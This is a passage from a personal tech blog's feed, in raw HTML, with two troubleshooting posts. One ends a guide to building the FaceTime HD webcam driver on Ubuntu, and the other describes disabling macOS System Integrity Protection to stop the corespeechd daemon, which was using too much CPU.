style="color:#393A34">]</span><span class="token plain">  /usr/local/src/bcwc_pcie/facetimehd.o</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Building modules, stage </span><span class="token number" style="color:#36acaa">2</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  MODPOST </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> modules</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  CC      /usr/local/src/bcwc_pcie/facetimehd.mod.o</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  LD </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">M</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">  /usr/local/src/bcwc_pcie/facetimehd.ko</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">make</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">: Leaving directory </span><span class="token string" style="color:#e3116c">'/usr/src/linux-headers-5.0.0-23-generic'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">make</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">make</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-C</span><span class="token plain"> /lib/modules/5.0.0-23-generic/build </span><span class="token assign-left variable" style="color:#36acaa">M</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/usr/local/src/bcwc_pcie modules_install</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">make</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">: Entering directory </span><span class="token string" style="color:#e3116c">'/usr/src/linux-headers-5.0.0-23-generic'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  INSTALL /usr/local/src/bcwc_pcie/facetimehd.ko</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">At main.c:160:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- SSL error:02001002:system library:fopen:No such </span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> or directory: </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">/crypto/bio/bss_file.c:72</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- SSL error:2006D080:BIO routines:BIO_new_file:no such file: </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">/crypto/bio/bss_file.c:79</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sign-file: certs/signing_key.pem: No such </span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> or directory</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  DEPMOD  </span><span class="token number" style="color:#36acaa">5.0</span><span class="token plain">.0-23-generic</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Warning: modules_install: missing </span><span class="token string" style="color:#e3116c">'System.map'</span><span class="token plain"> file. Skipping depmod.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">make</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">: Leaving directory </span><span class="token string" style="color:#e3116c">'/usr/src/linux-headers-5.0.0-23-generic'</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Don’t worry too much about the SSL errors above, they are red herrings.
I then needed to load the drivers into the kernel:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> depmod</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> modprobe </span><span class="token parameter variable" style="color:#36acaa">-r</span><span class="token plain"> bdc_pci</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> modprobe facetimehd</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I relaunched Cheese and saw my messy face on the camera 🙂
But once I restarted the computer, I saw that the changes were reverted. I needed to persist them somehow. After some more research, I found that I needed to add <code>facetimehd</code> to the kernel modules that are loaded during boot time:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token builtin class-name">echo</span><span class="token plain"> facetimehd </span><span class="token operator" style="color:#393A34">&gt;&gt;</span><span class="token plain"> /etc/modules</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>After restarting, I saw that I was able to detect my camera in Zoom and Cheese!</p>]]></content>
        <author>
            <name>Kobbi Gal</name>
            <uri>https://github.com/kbbgl</uri>
        </author>
        <category label="Mac" term="Mac"/>
        <category label="Ubuntu" term="Ubuntu"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[MacBook Pro 2020 High CPU caused by Siri]]></title>
        <id>https://kbbgl.github.io/blog/macbook-pro-2020-high-cpu-caused-siri</id>
        <link href="https://kbbgl.github.io/blog/macbook-pro-2020-high-cpu-caused-siri"/>
        <updated>2025-02-26T00:45:50.000Z</updated>
        <summary type="html"><![CDATA[Fill me up!]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="introduction">Introduction<a href="https://kbbgl.github.io/blog/macbook-pro-2020-high-cpu-caused-siri#introduction" class="hash-link" aria-label="Direct link to Introduction" title="Direct link to Introduction">​</a></h2>
<p>A few months ago, I received a highly-anticipated 2020 32GB, 2.3 GHz Quad-Core Intel Core i7 MacBook Pro. Highly-anticipated because I already had one stolen (a 2019 version) earlier last year in a robbery in an AirBnB apartment I was renting while I was staying in Barcelona. It was quite a dramatic story but I won’t get into the details. This is a tech blog after all.</p>
<p>Back to the new computer I acquired, the thing was flying. I could open large projects in IntelliJ and VSCode, run a Kubernetes cluster using <a href="https://minikube.sigs.k8s.io/docs/start/" target="_blank" rel="noopener noreferrer"><code>minikube</code></a> and endless amounts of terminals simultaneously on different workspaces and the thing would not miss a beat.</p>
<p>Within the first week of receiving machine, I got a notification indicating that there was a system update. I never had any fears come with system updates. I always found myself jumping ship and hoping no regressions or new issues are introduced upon upgrades/updates. I’m not a skeptic, I believe Apple’s QA is up to the highest testing standards.</p>
<p>Anyway, I let the update run for a few hours and after a couple of restarts, the OS was back up and could work on the machine again.</p>
<p>Pretty soon thereafter, I heard the machine fan working intensively and the low-carbon aluminum enclosure was excessively hot. I also noticed that I the interaction with the OS and applications was crawlingly-slow. I even had the machine crash 2-3 times! I decided I had enough and that it was time to put on my Sherlock Holmes hat and start the investigation.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="finding-the-culprit-process">Finding the Culprit Process<a href="https://kbbgl.github.io/blog/macbook-pro-2020-high-cpu-caused-siri#finding-the-culprit-process" class="hash-link" aria-label="Direct link to Finding the Culprit Process" title="Direct link to Finding the Culprit Process">​</a></h2>
<p>It makes sense that the first place to review would be Activity Monitor. It allows us to check the amount of energy each running process is utilizing in addition to CPU cycles and RAM allocation. Below is the screenshot of what I saw after launching Activity Monitor:</p>
<p><img decoding="async" loading="lazy" src="https://tilsupport.files.wordpress.com/2021/03/image.png" alt="activity-monitor" class="img_ev3q"></p>
<p>We can see that the top process, <code>ZscalerTunnel</code> was really using up the CPU. I knew what this process belonged to (a VPN service). I was able to fix the <code>ZscalerTunnel</code> CPU hog by installing the latest version of the application and restarting the machine.</p>
<p>But the second process, <code>corespeechd</code> was not letting go and was at times using between 3 to 4 CPUs (300-400%). And the worst part was that I had no idea what <code>corespeechd</code> was (aside from a guess that it was some sort of daemon because of the letter ‘d’ in the suffix).</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-is-corespeechd">What is <code>corespeechd</code>?<a href="https://kbbgl.github.io/blog/macbook-pro-2020-high-cpu-caused-siri#what-is-corespeechd" class="hash-link" aria-label="Direct link to what-is-corespeechd" title="Direct link to what-is-corespeechd">​</a></h2>
<p>This question was hard to find online. I believe because I am not a registered Apple developer, I could not see any relevant documentation about this process/service. What I did find was that many people had a problem with this daemon hogging machine resources such as <a href="https://discussions.apple.com/thread/8643914?page=2" target="_blank" rel="noopener noreferrer">massive network utilization (1)</a> and <a href="https://discussions.apple.com/thread/250955260?page=2" target="_blank" rel="noopener noreferrer">massive network utilization (2)</a>. And I also found a lot of people experiencing the <a href="https://forums.macrumors.com/threads/cpu-usage-corespeechd.2158710/" target="_blank" rel="noopener noreferrer">high CPU consumption</a> and on <a href="https://twitter.com/alecmuffett/status/1089721018015539200?lang=en" target="_blank" rel="noopener noreferrer">Twitter as well</a>.</p>
<p>According to the online research, all fingers were pointing to one feature: Siri. In addition, all recommendations to mitigate this issue mentioned disabling/enabling or turning off Siri completely. Unfortunately for me, corespeechd was still causing problems after my attempt to disable Siri.
Since the machine had crashed a few times, I decided the next step would be to review the system crash report.
What I found was that the OS crashed because of a segmentation fault:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Crashed Thread:        </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  Dispatch queue: com.apple.main-thread</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Exception Type:        EXC_BAD_ACCESS </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">SIGSEGV</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Exception Codes:       KERN_INVALID_ADDRESS at 0x0000000108745050</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Exception Note:        EXC_CORPSE_NOTIFY</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Termination Signal:    Segmentation fault: </span><span class="token number" style="color:#36acaa">11</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Termination Reason:    Namespace SIGNAL, Code 0xb</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Terminating Process:   exc handler </span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">11719</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Thread </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> Crashed:: Dispatch queue: com.apple.main-thread</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0</span><span class="token plain">   libobjc.A.dylib                0x00007fff202639af objc_release + </span><span class="token number" style="color:#36acaa">15</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">   com.apple.CoreFoundation       0x00007fff20478a76 -</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">__NSDictionaryI dealloc</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> + </span><span class="token number" style="color:#36acaa">146</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2</span><span class="token plain">   libobjc.A.dylib                0x00007fff2028139d AutoreleasePoolPage::releaseUntil</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">objc_object**</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> + </span><span class="token number" style="color:#36acaa">167</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">3</span><span class="token plain">   libobjc.A.dylib                0x00007fff2026433e objc_autoreleasePoolPop + </span><span class="token number" style="color:#36acaa">161</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">4</span><span class="token plain">   com.apple.CoreFoundation       0x00007fff2047e1f0 _CFAutoreleasePoolPop + </span><span class="token number" style="color:#36acaa">22</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5</span><span class="token plain">   com.apple.CoreFoundation       0x00007fff20587748 __CFRunLoopPerCalloutARPEnd + </span><span class="token number" style="color:#36acaa">41</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">6</span><span class="token plain">   com.apple.CoreFoundation       0x00007fff204bc88b __CFRunLoopRun + </span><span class="token number" style="color:#36acaa">2788</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">7</span><span class="token plain">   com.apple.CoreFoundation       0x00007fff204bb6ce CFRunLoopRunSpecific + </span><span class="token number" style="color:#36acaa">563</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">8</span><span class="token plain">   com.apple.Foundation           0x00007fff21248fa1 -</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">NSRunLoop</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">NSRunLoop</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> runMode:beforeDate:</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> + </span><span class="token number" style="color:#36acaa">212</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">9</span><span class="token plain">   com.apple.Foundation           0x00007fff212d7384 -</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">NSRunLoop</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">NSRunLoop</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> run</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> + </span><span class="token number" style="color:#36acaa">76</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">10</span><span class="token plain">  com.apple.authorizationhost    0x0000000108661727 main + </span><span class="token number" style="color:#36acaa">302</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">11</span><span class="token plain">  libdyld.dylib                  0x00007fff203e0621 start + </span><span class="token number" style="color:#36acaa">1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>What was immediately visible was that there were instructions in memory address <code>0x00007fff20478a76</code> that were being allocated by the <code>com.apple.CoreFoundation</code> package. This gave me the evidence I needed that tied the system crash to the issues witnessed by the <code>Core</code> services.</p>
<p>I decided to run <code>corespeechd</code> using <code>strace</code> so I could see what system calls the process was executing during run-time. I found the following output indicating there was some permission issues attempting to access a certain process probe:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">dtrace: error on enabled probe ID </span><span class="token number" style="color:#36acaa">2378</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ID </span><span class="token number" style="color:#36acaa">918</span><span class="token plain">: syscall::kevent_id:return</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">: invalid user access </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> action </span><span class="token comment" style="color:#999988;font-style:italic">#5 at DIF offset 0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dtrace: error on enabled probe ID </span><span class="token number" style="color:#36acaa">2385</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ID </span><span class="token number" style="color:#36acaa">904</span><span class="token plain">: syscall::workq_kernreturn:return</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">: invalid user access </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> action </span><span class="token comment" style="color:#999988;font-style:italic">#5 at DIF offset 0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="using-launchctl-to-disable-corespeechd">Using <code>launchctl</code> to Disable <code>corespeechd</code><a href="https://kbbgl.github.io/blog/macbook-pro-2020-high-cpu-caused-siri#using-launchctl-to-disable-corespeechd" class="hash-link" aria-label="Direct link to using-launchctl-to-disable-corespeechd" title="Direct link to using-launchctl-to-disable-corespeechd">​</a></h2>
<p>Since Siri was already off, I was pretty sure that if I found a way to completely disable <code>corespeechd</code>, I would be able to release the daemon from eating up my processors.</p>
<p>I am familiar with using <code>systemctl</code> and <code>init.d</code> on Linux to be able to control system services. On Windows I usually just use the <code>Stop-Service</code> PowerShell cmdlet. But for Mac I wasn’t sure what command line tool needs to be used. I found out that the preferred way is to use <code>launchctl</code>.</p>
<p>I also wanted to understand where MacOS startup scripts are stored. I found out that there were 5 different directories:</p>
<ul>
<li><code>/System/Library/LaunchDaemons/</code>&nbsp;– System-wide daemons provided by the operating system.</li>
<li><code>/System/Library/LaunchAgents/</code>&nbsp;– Per-user agents provided by the operating system.</li>
<li><code>~/Library/LaunchAgents/</code>&nbsp;– Per-user agents provided by the user.</li>
<li><code>/Library/LaunchAgents/</code>&nbsp;– Per-user agents provided by the administrator.</li>
<li><code>/Library/LaunchDaemons/</code>&nbsp;– System-wide daemons provided by the administrator.</li>
</ul>
<p><code>launchd</code> manages the processes, both for the system as a whole and for individual users using configuration files with the <code>.plist</code> extension.</p>
<p>I reviewed the <code>launchctl</code> <code>man</code> page and found that we can disable a service by using the <code>unload</code> command, for example:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> launchctl unload </span><span class="token parameter variable" style="color:#36acaa">-w</span><span class="token plain"> com.apple.corespeechd</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>That looked great! The <code>corespeechd</code> daemon was no longer running and my CPU was back to normal consumption. Unfortunately, I realized my celebrations were premature when I restarted my machine. <code>corespeechd</code> was back up and feasting on my machine resources again.</p>
<p>I went back to the <code>launchctl man</code> page and found that there was another option, <code>remove</code>, that could do the trick as it seemed to perform a persistent disabling of services (unlike the <code>unload</code> operation which was temporary until system restart relaunched all daemons). The problem was that I was unable to run the command:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> launchctl remove com.apple.corespeechd</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>because the operating system had <a href="https://support.apple.com/en-us/HT204899" target="_blank" rel="noopener noreferrer">System Integrity Protection (SIP)</a> enabled. I found that I could use the csrutil command-line tool to interact with SIP. To interact with SIP, we need to go into Recovery Mode.</p>
<p>tl;dr ,these are the steps I took to completely disable <code>corespeechd</code>:</p>
<ol>
<li>Reboot the machine.</li>
<li>Press and hold <code>Command&nbsp;+ R</code>.</li>
<li>Once the Recovery menu loads up, in the top menu bar, select <code>Utilities &gt; Terminal</code>.</li>
<li>Run the following command to disable System Integrity&nbsp;Protection (SIP):</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">csrutil disable</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<ol>
<li>Reboot the machine.</li>
<li>Press and hold Command&nbsp;+ R.</li>
<li>Once the Recovery menu loads up, in the top menu bar, select Utilities &gt; Terminal.</li>
<li>Run the following command to disable System Integrity&nbsp;Protection (SIP):</li>
</ol>
<p>You should see the following message to acknowledge that SIP was actually disabled:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">System Integrity Protection status: disabled.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<ol>
<li>Reboot the machine.</li>
<li>When OS loads, open a Terminal and run the following command to disable&nbsp;<code>corespeechd</code>&nbsp;daemon:</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> launchctl remove com.apple.corespeechd</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>You should see that&nbsp;corespeechd&nbsp;daemon is no longer running and consuming massive CPU!</p>]]></content>
        <author>
            <name>Kobbi Gal</name>
            <uri>https://github.com/kbbgl</uri>
        </author>
        <category label="Apple" term="Apple"/>
        <category label="Corespeechd" term="Corespeechd"/>
